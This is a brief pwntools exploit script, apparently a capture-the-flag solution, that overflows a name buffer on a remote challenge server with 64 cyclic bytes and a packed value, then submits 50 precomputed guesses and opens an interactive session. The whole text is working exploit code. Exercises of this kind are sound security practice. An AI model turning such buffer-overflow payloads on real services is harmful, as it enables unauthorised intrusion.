from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('111.198.29.45', 30818)


array = [2,5,4,2,6,2,5,1,4,2,3,2,3,2,6,5,1,1,5,5,6,3,4,4,3,3,3,2,2,2,6,1,1,1,6,4,2,5,2,5,4,4,4,6,3,2,3,3,6,1]
t.recvuntil('name: ')
t.send(cyclic(64) + p32(1))
for i in range(50):
	t.sendlineafter(': ', str(array[i]))

t.interactive()